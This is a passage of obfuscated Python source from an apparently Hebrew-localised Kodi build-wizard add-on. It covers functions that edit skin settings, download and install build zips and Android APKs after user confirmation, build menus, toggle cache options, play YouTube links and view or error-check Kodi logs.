			OOOOOOOO0OOOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4249
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'r')#line:4251
			O0OOOO0OO00O0OO00 =OO00OO0000000OOO0 .read ()#line:4252
			OO00OO0000000OOO0 .close ()#line:4253
			OOO00000O000O0OO0 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4254
			O0O0OO0OOO0O00000 =re .compile (OOO00000O000O0OO0 ).findall (O0OOOO0OO00O0OO00 )[0 ]#line:4255
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'w')#line:4256
			OO00OO0000000OOO0 .write (O0OOOO0OO00O0OO00 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0O0OO0OOO0O00000 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4257
			OO00OO0000000OOO0 .close ()#line:4258
			OOOOOOOO0OOOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4262
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'r')#line:4264
			O0OOOO0OO00O0OO00 =OO00OO0000000OOO0 .read ()#line:4265
			OO00OO0000000OOO0 .close ()#line:4266
			OOO00000O000O0OO0 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4267
			O0O0OO0OOO0O00000 =re .compile (OOO00000O000O0OO0 ).findall (O0OOOO0OO00O0OO00 )[0 ]#line:4268
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'w')#line:4269
			OO00OO0000000OOO0 .write (O0OOOO0OO00O0OO00 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0O0OO0OOO0O00000 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4270
			OO00OO0000000OOO0 .close ()#line:4271
			OOOOOOOO0OOOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4275
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'r')#line:4277
			O0OOOO0OO00O0OO00 =OO00OO0000000OOO0 .read ()#line:4278
			OO00OO0000000OOO0 .close ()#line:4279
			OOO00000O000O0OO0 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4280
			O0O0OO0OOO0O00000 =re .compile (OOO00000O000O0OO0 ).findall (O0OOOO0OO00O0OO00 )[0 ]#line:4281
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'w')#line:4282
			OO00OO0000000OOO0 .write (O0OOOO0OO00O0OO00 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0O0OO0OOO0O00000 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4283
			OO00OO0000000OOO0 .close ()#line:4284
		except :#line:4289
			pass #line:4290
def thirdPartyInstall (O00000OOOO0OOO00O ,OO0OOOO0O0OO0OO0O ):#line:4292
	if not wiz .workingURL (OO0OOOO0O0OO0OO0O ):#line:4293
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4294
	O0OO0O00O00OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOOO0OOO00O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4295
	if O0OO0O00O00OOO0OO ==1 :#line:4296
		freshStart ('third',True )#line:4297
	wiz .clearS ('build')#line:4298
	O00OO0OO000OOOOO0 =O00000OOOO0OOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4299
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4300
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000OOOO0OOO00O ),'','אנא המתן')#line:4301
	O000OO0O0OO000O0O =os .path .join (PACKAGES ,'%s.zip'%O00OO0OO000OOOOO0 )#line:4302
	try :os .remove (O000OO0O0OO000O0O )#line:4303
	except :pass #line:4304
	downloader .download (OO0OOOO0O0OO0OO0O ,O000OO0O0OO000O0O ,DP )#line:4305
	xbmc .sleep (1000 )#line:4306
	O0O0OOOOOO0OOO0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000OOOO0OOO00O )#line:4307
	DP .update (0 ,O0O0OOOOOO0OOO0OO ,'','אנא המתן')#line:4308
	OOOOOOOOO0O0OOO0O ,OO00OO00OO00OOO00 ,OOOO0OO00OOOOO0OO =extract .all (O000OO0O0OO000O0O ,HOME ,DP ,title =O0O0OOOOOO0OOO0OO )#line:4309
	if int (float (OOOOOOOOO0O0OOO0O ))>0 :#line:4310
		wiz .fixmetas ()#line:4311
		wiz .lookandFeelData ('save')#line:4312
		wiz .defaultSkin ()#line:4313
		wiz .setS ('installed','true')#line:4315
		wiz .setS ('extract',str (OOOOOOOOO0O0OOO0O ))#line:4316
		wiz .setS ('errors',str (OO00OO00OO00OOO00 ))#line:4317
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOOOOOOO0O0OOO0O ,OO00OO00OO00OOO00 ))#line:4318
		try :os .remove (O000OO0O0OO000O0O )#line:4319
		except :pass #line:4320
		if int (float (OO00OO00OO00OOO00 ))>0 :#line:4321
			OO0OOO0OO0O0OOOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000OOOO0OOO00O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOOOOOOO0O0OOO0O ,'%',COLOR1 ,OO00OO00OO00OOO00 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4322
			if OO0OOO0OO0O0OOOO0 :#line:4323
				if isinstance (OO00OO00OO00OOO00 ,unicode ):#line:4324
					OOOO0OO00OOOOO0OO =OOOO0OO00OOOOO0OO .encode ('utf-8')#line:4325
				wiz .TextBox (ADDONTITLE ,OOOO0OO00OOOOO0OO )#line:4326
	DP .close ()#line:4327
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4328
	if INSTALLMETHOD ==1 :O00O0OO0OO0O0OO00 =1 #line:4329
	elif INSTALLMETHOD ==2 :O00O0OO0OO0O0OO00 =0 #line:4330
	else :O00O0OO0OO0O0OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4331
	if O00O0OO0OO0O0OO00 ==1 :wiz .reloadFix ()#line:4332
	else :wiz .killxbmc (True )#line:4333
def testTheme (OO0O00O0OO0OOOOO0 ):#line:4335
	OOO0O0O0OOOO0OOO0 =zipfile .ZipFile (OO0O00O0OO0OOOOO0 )#line:4336
	for OOOOOO0000O0O0O00 in OOO0O0O0OOOO0OOO0 .infolist ():#line:4337
		if '/settings.xml'in OOOOOO0000O0O0O00 .filename :#line:4338
			return True #line:4339
	return False #line:4340
def testGui (OO00O00000OOO0O00 ):#line:4342
	O00O0OOO0OO0OO000 =zipfile .ZipFile (OO00O00000OOO0O00 )#line:4343
	for O0O0OOO0O0OOOO000 in O00O0OOO0OO0OO000 .infolist ():#line:4344
		if '/guisettings.xml'in O0O0OOO0O0OOOO000 .filename :#line:4345
			return True #line:4346
	return False #line:4347
def apkInstaller (O000OOOO000O0OOO0 ,O00O0OOO0000O0O00 ):#line:4349
	wiz .log (O000OOOO000O0OOO0 )#line:4350
	wiz .log (O00O0OOO0000O0O00 )#line:4351
	if wiz .platform ()=='android':#line:4352
		OO0OO0O0OO0O0OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OOOO000O0OOO0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4353
		if not OO0OO0O0OO0O0OOO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4354
		O000OO0O00OOO00OO =O000OOOO000O0OOO0 #line:4355
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4356
		if not wiz .workingURL (O00O0OOO0000O0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4357
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OO0O00OOO00OO ),'','אנא המתן')#line:4358
		OO0O0O0O0000OO00O =os .path .join (PACKAGES ,"%s.apk"%O000OOOO000O0OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4359
		try :os .remove (OO0O0O0O0000OO00O )#line:4360
		except :pass #line:4361
		downloader .download (O00O0OOO0000O0O00 ,OO0O0O0O0000OO00O ,DP )#line:4362
		xbmc .sleep (100 )#line:4363
		DP .close ()#line:4364
		notify .apkInstaller (O000OOOO000O0OOO0 )#line:4365
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0O0O0O0000OO00O +'")')#line:4366
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4367
def createMenu (OO00OO000OO0OO000 ,OOO00O0OOO0000O00 ,O00O0O000000OOOO0 ):#line:4373
	if OO00OO000OO0OO000 =='saveaddon':#line:4374
		OOO000O0O0O0O0000 =[]#line:4375
		O0OO0O00O0OO0OOO0 =urllib .quote_plus (OOO00O0OOO0000O00 .lower ().replace (' ',''))#line:4376
		O0OOOOO0OO0OOOO0O =OOO00O0OOO0000O00 .replace ('Debrid','Real Debrid')#line:4377
		O00OO00O0O0O000O0 =urllib .quote_plus (O00O0O000000OOOO0 .lower ().replace (' ',''))#line:4378
		O00O0O000000OOOO0 =O00O0O000000OOOO0 .replace ('url','URL Resolver')#line:4379
		OOO000O0O0O0O0000 .append ((THEME2 %O00O0O000000OOOO0 .title (),' '))#line:4380
		OOO000O0O0O0O0000 .append ((THEME3 %'Save %s Data'%O0OOOOO0OO0OOOO0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OO0O00O0OO0OOO0 ,O00OO00O0O0O000O0 )))#line:4381
		OOO000O0O0O0O0000 .append ((THEME3 %'Restore %s Data'%O0OOOOO0OO0OOOO0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OO0O00O0OO0OOO0 ,O00OO00O0O0O000O0 )))#line:4382
		OOO000O0O0O0O0000 .append ((THEME3 %'Clear %s Data'%O0OOOOO0OO0OOOO0O ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0OO0O00O0OO0OOO0 ,O00OO00O0O0O000O0 )))#line:4383
	elif OO00OO000OO0OO000 =='save':#line:4384
		OOO000O0O0O0O0000 =[]#line:4385
		O0OO0O00O0OO0OOO0 =urllib .quote_plus (OOO00O0OOO0000O00 .lower ().replace (' ',''))#line:4386
		O0OOOOO0OO0OOOO0O =OOO00O0OOO0000O00 .replace ('Debrid','Real Debrid')#line:4387
		O00OO00O0O0O000O0 =urllib .quote_plus (O00O0O000000OOOO0 .lower ().replace (' ',''))#line:4388
		O00O0O000000OOOO0 =O00O0O000000OOOO0 .replace ('url','URL Resolver')#line:4389
		OOO000O0O0O0O0000 .append ((THEME2 %O00O0O000000OOOO0 .title (),' '))#line:4390
		OOO000O0O0O0O0000 .append ((THEME3 %'Register %s'%O0OOOOO0OO0OOOO0O ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0OO0O00O0OO0OOO0 ,O00OO00O0O0O000O0 )))#line:4391
		OOO000O0O0O0O0000 .append ((THEME3 %'Save %s Data'%O0OOOOO0OO0OOOO0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OO0O00O0OO0OOO0 ,O00OO00O0O0O000O0 )))#line:4392
		OOO000O0O0O0O0000 .append ((THEME3 %'Restore %s Data'%O0OOOOO0OO0OOOO0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OO0O00O0OO0OOO0 ,O00OO00O0O0O000O0 )))#line:4393
		OOO000O0O0O0O0000 .append ((THEME3 %'Import %s Data'%O0OOOOO0OO0OOOO0O ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0OO0O00O0OO0OOO0 ,O00OO00O0O0O000O0 )))#line:4394
		OOO000O0O0O0O0000 .append ((THEME3 %'Clear Addon %s Data'%O0OOOOO0OO0OOOO0O ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0OO0O00O0OO0OOO0 ,O00OO00O0O0O000O0 )))#line:4395
	elif OO00OO000OO0OO000 =='install':#line:4396
		OOO000O0O0O0O0000 =[]#line:4397
		O00OO00O0O0O000O0 =urllib .quote_plus (O00O0O000000OOOO0 )#line:4398
		OOO000O0O0O0O0000 .append ((THEME2 %O00O0O000000OOOO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O00OO00O0O0O000O0 )))#line:4399
		OOO000O0O0O0O0000 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O00OO00O0O0O000O0 )))#line:4400
		OOO000O0O0O0O0000 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O00OO00O0O0O000O0 )))#line:4401
		OOO000O0O0O0O0000 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O00OO00O0O0O000O0 )))#line:4402
		OOO000O0O0O0O0000 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O00OO00O0O0O000O0 )))#line:4403
	OOO000O0O0O0O0000 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4404
	return OOO000O0O0O0O0000 #line:4405
def toggleCache (O00OO000O00O0OOO0 ):#line:4407
	OO0O0O0OO00O0O000 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4408
	OOO0OO0O0O0000O00 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4409
	if O00OO000O00O0OOO0 in ['true','false']:#line:4410
		for O0O00OO00O0000000 in OO0O0O0OO00O0O000 :#line:4411
			wiz .setS (O0O00OO00O0000000 ,O00OO000O00O0OOO0 )#line:4412
	else :#line:4413
		if not O00OO000O00O0OOO0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4414
			try :#line:4415
				O0O00OO00O0000000 =OOO0OO0O0O0000O00 [OO0O0O0OO00O0O000 .index (O00OO000O00O0OOO0 )]#line:4416
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0O00OO00O0000000 ))#line:4417
			except :#line:4418
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O00OO000O00O0OOO0 ))#line:4419
		else :#line:4420
			O00O0O0000OO00O0O ='true'if wiz .getS (O00OO000O00O0OOO0 )=='false'else 'false'#line:4421
			wiz .setS (O00OO000O00O0OOO0 ,O00O0O0000OO00O0O )#line:4422
def playVideo (OO0OO00O00OO000OO ):#line:4424
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO0OO00O00OO000OO )#line:4425
	if 'watch?v='in OO0OO00O00OO000OO :#line:4426
		OO0000O000OOO0O00 ,O0OOO000000O00000 =OO0OO00O00OO000OO .split ('?')#line:4427
		O00O0O00OO0OOOOOO =O0OOO000000O00000 .split ('&')#line:4428
		for O0OOO00OOOO0OO0OO in O00O0O00OO0OOOOOO :#line:4429
			if O0OOO00OOOO0OO0OO .startswith ('v='):#line:4430
				OO0OO00O00OO000OO =O0OOO00OOOO0OO0OO [2 :]#line:4431
				break #line:4432
			else :continue #line:4433
	elif 'embed'in OO0OO00O00OO000OO or 'youtu.be'in OO0OO00O00OO000OO :#line:4434
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO0OO00O00OO000OO )#line:4435
		OO0000O000OOO0O00 =OO0OO00O00OO000OO .split ('/')#line:4436
		if len (OO0000O000OOO0O00 [-1 ])>5 :#line:4437
			OO0OO00O00OO000OO =OO0000O000OOO0O00 [-1 ]#line:4438
		elif len (OO0000O000OOO0O00 [-2 ])>5 :#line:4439
			OO0OO00O00OO000OO =OO0000O000OOO0O00 [-2 ]#line:4440
	wiz .log ("YouTube URL: %s"%OO0OO00O00OO000OO )#line:4441
	yt .PlayVideo (OO0OO00O00OO000OO )#line:4442
def viewLogFile ():#line:4444
	O000O000O0O00O000 =wiz .Grab_Log (True )#line:4445
	OOO000O00OO00OOOO =wiz .Grab_Log (True ,True )#line:4446
	OO000000OOO00O00O =0 ;O0O000O0OO000000O =O000O000O0O00O000 #line:4447
	if not OOO000O00OO00OOOO ==False and not O000O000O0O00O000 ==False :#line:4448
		OO000000OOO00O00O =DIALOG .select (ADDONTITLE ,["View %s"%O000O000O0O00O000 .replace (LOG ,""),"View %s"%OOO000O00OO00OOOO .replace (LOG ,"")])#line:4449
		if OO000000OOO00O00O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4450
	elif O000O000O0O00O000 ==False and OOO000O00OO00OOOO ==False :#line:4451
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4452
		return #line:4453
	elif not O000O000O0O00O000 ==False :OO000000OOO00O00O =0 #line:4454
	elif not OOO000O00OO00OOOO ==False :OO000000OOO00O00O =1 #line:4455
	O0O000O0OO000000O =O000O000O0O00O000 if OO000000OOO00O00O ==0 else OOO000O00OO00OOOO #line:4457
	OOOO00O0OO000OO0O =wiz .Grab_Log (False )if OO000000OOO00O00O ==0 else wiz .Grab_Log (False ,True )#line:4458
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0O000O0OO000000O ),OOOO00O0OO000OO0O )#line:4460
def errorChecking (log =None ,count =None ,all =None ):#line:4462
	if log ==None :#line:4463
		O0O00OO000O00OOOO =wiz .Grab_Log (True )#line:4464
		OOO0OO00OOOO00O0O =wiz .Grab_Log (True ,True )#line:4465
		if not OOO0OO00OOOO00O0O ==False and not O0O00OO000O00OOOO ==False :#line:4466
			OOO0O0OOO0O0O000O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O00OO000O00OOOO .replace (LOG ,""),errorChecking (O0O00OO000O00OOOO ,True ,True )),"View %s: %s error(s)"%(OOO0OO00OOOO00O0O .replace (LOG ,""),errorChecking (OOO0OO00OOOO00O0O ,True ,True ))])#line:4467
			if OOO0O0OOO0O0O000O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4468
		elif O0O00OO000O00OOOO ==False and OOO0OO00OOOO00O0O ==False :#line:4469
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4470
			return #line:4471
		elif not O0O00OO000O00OOOO ==False :OOO0O0OOO0O0O000O =0 #line:4472
		elif not OOO0OO00OOOO00O0O ==False :OOO0O0OOO0O0O000O =1 #line:4473
		log =O0O00OO000O00OOOO if OOO0O0OOO0O0O000O ==0 else OOO0OO00OOOO00O0O #line:4474
	if log ==False :#line:4475
		if count ==None :#line:4476
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4477
			return False #line:4478
		else :#line:4479
			return 0 #line:4480
	else :#line:4481
		if os .path .exists (log ):#line:4482
			OO0O00O0000O00O00 =open (log ,mode ='r');O000OO000OOOO000O =OO0O00O0000O00O00 .read ().replace ('\n','').replace ('\r','');OO0O00O0000O00O00 .close ()#line:4483
			OOO0OO00O0O000000 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O000OO000OOOO000O )#line:4484
			if not count ==None :#line:4485
				if all ==None :#line:4486
					OOOO00OO000000O00 =0 #line:4487
					for OOOOOO000O0OOOOOO in OOO0OO00O0O000000 :#line:4488
						if ADDON_ID in OOOOOO000O0OOOOOO :OOOO00OO000000O00 +=1 #line:4489
					return OOOO00OO000000O00 #line:4490
				else :return len (OOO0OO00O0O000000 )#line:4491
			if len (OOO0OO00O0O000000 )>0 :#line:4492
				OOOO00OO000000O00 =0 ;OO000O0O0O00O00O0 =""#line:4493
				for OOOOOO000O0OOOOOO in OOO0OO00O0O000000 :#line:4494
					if all ==None and not ADDON_ID in OOOOOO000O0OOOOOO :continue #line:4495
					else :#line:4496
						OOOO00OO000000O00 +=1 #line:4497
						OO000O0O0O00O00O0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOO00OO000000O00 ,OOOOOO000O0OOOOOO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4498
				if OOOO00OO000000O00 >0 :#line:4499
					wiz .TextBox (ADDONTITLE ,OO000O0O0O00O00O0 )#line:4500
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4501
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4502
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4503
ACTION_PREVIOUS_MENU =10 #line:4505
ACTION_NAV_BACK =92 #line:4506
ACTION_MOVE_LEFT =1 #line:4507
ACTION_MOVE_RIGHT =2 #line:4508
ACTION_MOVE_UP =3 #line:4509
ACTION_MOVE_DOWN =4 #line:4510
ACTION_MOUSE_WHEEL_UP =104 #line:4511
ACTION_MOUSE_WHEEL_DOWN =105 #line:4512
ACTION_MOVE_MOUSE =107 #line:4513
ACTION_SELECT_ITEM =7 #line:4514
ACTION_BACKSPACE =110 #line:4515
ACTION_MOUSE_LEFT_CLICK =100 #line:4516
ACTION_MOUSE_LONG_CLICK =108 #line:4517
def LogViewer (default =None ):#line:4519
	class OOO00000OO0O00000 (xbmcgui .WindowXMLDialog ):#line:4520
		def __init__ (O0OO00O0O00O00O00 ,*OO0OOOO0OO0O00OOO ,**O00000OO000O000OO ):#line:4521
			O0OO00O0O00O00O00 .default =O00000OO000O000OO ['default']#line:4522
		def onInit (OOOO0OOO0O0OO00O0 ):#line:4524
			OOOO0OOO0O0OO00O0 .title =101 #line:4525
			OOOO0OOO0O0OO00O0 .msg =102 #line:4526
			OOOO0OOO0O0OO00O0 .scrollbar =103 #line:4527
			OOOO0OOO0O0OO00O0 .upload =201 #line:4528
			OOOO0OOO0O0OO00O0 .kodi =202 #line:4529
			OOOO0OOO0O0OO00O0 .kodiold =203 #line:4530
			OOOO0OOO0O0OO00O0 .wizard =204 #line:4531
			OOOO0OOO0O0OO00O0 .okbutton =205 #line:4532
			O0OOOOOO0OOO00OO0 =open (OOOO0OOO0O0OO00O0 .default ,'r')#line:4533
			OOOO0OOO0O0OO00O0 .logmsg =O0OOOOOO0OOO00OO0 .read ()#line:4534
			O0OOOOOO0OOO00OO0 .close ()#line:4535
			OOOO0OOO0O0OO00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0OOO0O0OO00O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4536
			OOOO0OOO0O0OO00O0 .showdialog ()#line:4537
		def showdialog (O0O000OOO00O0O0OO ):#line:4539
			O0O000OOO00O0O0OO .getControl (O0O000OOO00O0O0OO .title ).setLabel (O0O000OOO00O0O0OO .titlemsg )#line:4540
			O0O000OOO00O0O0OO .getControl (O0O000OOO00O0O0OO .msg ).setText (wiz .highlightText (O0O000OOO00O0O0OO .logmsg ))#line:4541
			O0O000OOO00O0O0OO .setFocusId (O0O000OOO00O0O0OO .scrollbar )#line:4542
		def onClick (O0O00O00000OO000O ,OOOOO0O000OO000O0 ):#line:4544
			if OOOOO0O000OO000O0 ==O0O00O00000OO000O .okbutton :O0O00O00000OO000O .close ()#line:4545
			elif OOOOO0O000OO000O0 ==O0O00O00000OO000O .upload :O0O00O00000OO000O .close ();uploadLog .Main ()#line:4546
			elif OOOOO0O000OO000O0 ==O0O00O00000OO000O .kodi :#line:4547
				O0000000OO00O0O0O =wiz .Grab_Log (False )#line:4548
				O00OO0000O0OO000O =wiz .Grab_Log (True )#line:4549
				if O0000000OO00O0O0O ==False :#line:4550
					O0O00O00000OO000O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4551
					O0O00O00000OO000O .getControl (O0O00O00000OO000O .msg ).setText ("Log File Does Not Exists!")#line:4552
				else :#line:4553
					O0O00O00000OO000O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OO0000O0OO000O .replace (LOG ,''))#line:4554
					O0O00O00000OO000O .getControl (O0O00O00000OO000O .title ).setLabel (O0O00O00000OO000O .titlemsg )#line:4555
					O0O00O00000OO000O .getControl (O0O00O00000OO000O .msg ).setText (wiz .highlightText (O0000000OO00O0O0O ))#line:4556
					O0O00O00000OO000O .setFocusId (O0O00O00000OO000O .scrollbar )#line:4557
			elif OOOOO0O000OO000O0 ==O0O00O00000OO000O .kodiold :#line:4558
				O0000000OO00O0O0O =wiz .Grab_Log (False ,True )#line:4559
				O00OO0000O0OO000O =wiz .Grab_Log (True ,True )#line:4560
				if O0000000OO00O0O0O ==False :#line:4561
					O0O00O00000OO000O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4562
					O0O00O00000OO000O .getControl (O0O00O00000OO000O .msg ).setText ("Log File Does Not Exists!")#line:4563
				else :#line:4564
					O0O00O00000OO000O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OO0000O0OO000O .replace (LOG ,''))#line:4565
					O0O00O00000OO000O .getControl (O0O00O00000OO000O .title ).setLabel (O0O00O00000OO000O .titlemsg )#line:4566
					O0O00O00000OO000O .getControl (O0O00O00000OO000O .msg ).setText (wiz .highlightText (O0000000OO00O0O0O ))#line:4567
					O0O00O00000OO000O .setFocusId (O0O00O00000OO000O .scrollbar )#line:4568
			elif OOOOO0O000OO000O0 ==O0O00O00000OO000O .wizard :#line:4569
				O0000000OO00O0O0O =wiz .Grab_Log (False ,False ,True )#line:4570
				O00OO0000O0OO000O =wiz .Grab_Log (True ,False ,True )#line:4571
				if O0000000OO00O0O0O ==False :#line:4572
					O0O00O00000OO000O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4573
					O0O00O00000OO000O .getControl (O0O00O00000OO000O .msg ).setText ("Log File Does Not Exists!")#line:4574
				else :#line:4575
					O0O00O00000OO000O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OO0000O0OO000O .replace (ADDONDATA ,''))#line:4576
					O0O00O00000OO000O .getControl (O0O00O00000OO000O .title ).setLabel (O0O00O00000OO000O .titlemsg )#line:4577
					O0O00O00000OO000O .getControl (O0O00O00000OO000O .msg ).setText (wiz .highlightText (O0000000OO00O0O0O ))#line:4578
					O0O00O00000OO000O .setFocusId (O0O00O00000OO000O .scrollbar )#line:4579
		def onAction (O0OOO0000OO0O0000 ,O0OO00OO000O00000 ):#line:4581
			if O0OO00OO000O00000 ==ACTION_PREVIOUS_MENU :O0OOO0000OO0O0000 .close ()#line:4582
			elif O0OO00OO000O00000 ==ACTION_NAV_BACK :O0OOO0000OO0O0000 .close ()#line:4583
	if default ==None :default =wiz .Grab_Log (True )#line:4584
	OOOO0OOO0OOOOO000 =OOO00000OO0O00000 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4585
	OOOO0OOO0OOOOO000 .doModal ()#line:4586
